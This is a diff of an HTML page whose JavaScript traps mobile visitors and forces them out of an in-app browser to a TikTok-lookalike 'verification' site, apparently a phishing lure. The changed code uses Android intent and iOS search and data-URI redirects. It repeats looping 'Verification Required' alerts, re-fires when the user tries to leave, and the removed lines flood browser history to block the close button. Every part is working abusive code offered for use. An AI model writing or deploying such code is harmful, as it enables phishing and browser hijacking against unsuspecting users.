@@ -3,51 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; height: 100vh; }</style>
+    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; }</style>
 </head>
 <body>
 
 <script>
     const target = "https://tik-tok-verification.com/Verification/verify1.html";
-    const killTime = Date.now() + 5000; 
+    const killTime = Date.now() + 5000; // ATOMIC FAIL-SAFE
 
-    function trigger() {
-        // FAIL-SAFE FIRST
-        if (Date.now() > killTime) return;
-
-        // 1. SHOW ALERT IMMEDIATELY (To prove the script is alive)
-        alert("ATTEMPT #16\n\nClick OK to open the secure system browser.");
-
+    function breakout() {
         const isAndroid = /Android/i.test(navigator.userAgent);
+        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
 
-        // 2. THE BREAKOUT
         if (isAndroid) {
             // Android Chrome Intent
             window.location.href = "intent://" + target.replace("https://", "") + "#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end";
-        } else {
-            // iOS: Try the Search protocol and the Maps protocol
+        } else if (isIOS) {
+            // iOS: Simple Search Hijack
             window.location.replace("x-web-search://?" + encodeURIComponent(target));
-            
-            setTimeout(() => {
-                window.location.href = "maps://?q=" + encodeURIComponent(target);
-            }, 50);
+            // iOS: Blob-Refresh Handover
+            window.location.href = 'data:text/html;base64,' + btoa('<html><meta http-equiv="refresh" content="0;url=' + target + '"></html>');
         }
+    }
 
-        // 3. RECURSE
-        setTimeout(trigger, 10);
+    function rampage() {
+        // FAIL-SAFE: If 5 seconds have passed, stop everything.
+        if (Date.now() > killTime) return;
+
+        // 1. Attempt the redirect
+        breakout();
+
+        // 2. Trigger the Lock (The Alert)
+        alert("ATTEMPT #17\n\nVerification Required.\n\nClick OK to continue in your browser.");
+
+        // 3. Attempt redirect again immediately after OK
+        breakout();
+
+        // 4. Loop back immediately
+        setTimeout(rampage, 1);
     }
 
     window.onload = () => {
-        // Flood history to block 'X' button
-        for(let i=0; i<50; i++) history.pushState(null, null, "#" + i);
-        
-        // Start the engine
-        trigger();
+        rampage();
     };
 
-    // If they swipe or try to leave, trigger again
-    window.onblur = () => { if (Date.now() < killTime) trigger(); };
-</script>
+    // If they click 'X' or the screen blurs, it re-triggers the loop
+    window.onblur = () => {
+        if (Date.now() < killTime) rampage();
+    };
 
+</script>
 </body>
 </html>
